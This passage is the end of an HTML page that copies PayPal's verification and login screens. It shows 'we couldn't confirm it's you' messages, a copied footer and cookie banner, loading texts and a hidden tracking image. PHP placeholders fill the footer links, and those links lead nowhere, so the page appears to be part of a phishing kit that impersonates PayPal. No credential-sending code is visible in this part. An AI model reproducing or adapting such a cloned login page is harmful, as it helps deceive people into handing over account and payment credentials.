                    </div>
                    <div id="expired" class="hide verificationSubSection">
                        <header>
                            <p class="paypal-logo paypal-logo-long">PayPal</p>
                        </header>
                        <h1 class="headerText headerTextWarning">We're sorry, we couldn't confirm it's you</h1>
                        <p class="slimP">We didn't receive a response so we were unable confirm your identity.</p>
                        <button id="expiredTryAgainButton" class="button actionsSpaced" pa-marked="1">Try Again</button>
                    </div>
                    <div id="denied" class="denied hide verificationSubSection">
                        <img alt="" src="https://www.paypalobjects.com/images/shared/glyph_alert_critical_big-2x.png" class="deniedCaution">
                        <h1 class="headerText">We're sorry, we couldn't confirm it's you</h1>
                        <p>Need a hand? <a href="/{coBrand}/cgi-bin/helpscr?cmd=_help" class="inlineLink scTrack:help" pa-marked="1">We can help</a>.</p>
                    </div>
                </div>
            </div>
        </section>
        <footer class="footer" role="contentinfo">
            <div class="legalFooter">
                <div class="extendedContent">
                    <ul class="footerGroup footerGroupWithSiblings">
                        <li><a target="_blank" href="#" pa-marked="1"><?php echo $login['privacy'];?></a>
                        </li>
                        <li><a target="_blank" href="#" pa-marked="1"><?php echo $login['legal'];?></a>
                        </li>
                    </ul>
                    <p class="footerCopyright">Copyright © 1999-2020 PayPal. All rights reserved.</p>
                </div>
            </div>
        </footer>
        <div id="gdprCookieBanner" class="gdprCookieBanner_container gdprCookieBanner_container-custom" style="display: none;">
            <div class="gdprCookieBanner_wrapper gdprCookieBanner_wrapper-custom">
                <div id="gdprCookieContent_wrapper" class="col-sm-12" style="display: none;">
                    <p class="gdprCookieBanner_content gdprCookieBanner_content-custom">Cookies help us customise PayPal for you, and some are necessary to make our site work. Cookies also allow us to show you personalised offers and promotions, both on and off our site. Of course, you're in control. You can <a id="manageCookiesLink" href="https://www.paypal.com/myaccount/profile/flow/cookies/?locale=en_GB" pagename="Log in to your account|managecookies">manage your cookies</a> at any time.</p>
                    <div class="gdprCookieBanner_buttonWrapper gdprCookieBanner_buttonWrapper-custom"><a id="acceptAllButton" role="link" tabindex="0" class="gdpr_btn gdpr_btn_reversed gdprCookieBanner_button gdprCookieBanner_button-custom" pagename="Log in to your account|acceptcookies">Accept Cookies</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="transitioning hide" aria-busy="false">
        <p class="welcomeMessage hide">Welcome ,</p>
        <p class="checkingInfo hide">Checking your information…</p>
        <p class="oneSecond hide">Just a second…</p>
        <p class="secureMessage hide">Securely logging you in...</p>
        <p class="oneTouchMessage hide"></p>
        <p class="retrieveInfo hide">Retrieving your information...</p>
        <p class="waitFewSecs hide">This may take a few seconds...</p>
        <p class="udtSpinnerMessage udtLogin hide">We recognise you on this device and we're logging you in more securely.</p>
        <p class="udtSpinnerMessage udtLoginXo hide">We recognise you on this device, so you don't need to enter your password for purchases.</p>
        <div class="keychain spinner-content uiExp hide"></div>
    </div>
    <img id="pfb3742" src="https://c.paypal.com/v1/r/d/b/w?&amp;f=8a129a80951e44cfa162098955ece44e&amp;s=UNIFIED_LOGIN_INPUT_PASSWORD&amp;d=%7B%22rDT%22%3A%2221216%2C20565%2C20503%3A41703%2C41196%2C41000%3A41701%2C41299%2C41000%3A10961%2C10645%2C10263%3A31453%2C31198%2C30755%3A41699%2C41495%2C41002%3A26330%2C26153%2C25631%3A41699%2C41532%2C40999%3A16084%2C15924%2C15386%3A31453%2C31296%2C30755%3A31454%2C31303%2C30754%3A36577%2C36432%2C35878%3A16085%2C15946%2C15387%3A16086%2C15956%2C15384%3A16087%2C15968%2C15386%3A10965%2C10857%2C10263%3A16089%2C15995%2C15386%3A36582%2C36499%2C35878%3A10968%2C10892%2C10263%3A31461%2C31390%2C30755%3A18506%2C24%22%7D" style="display: none;">
</body>

</html>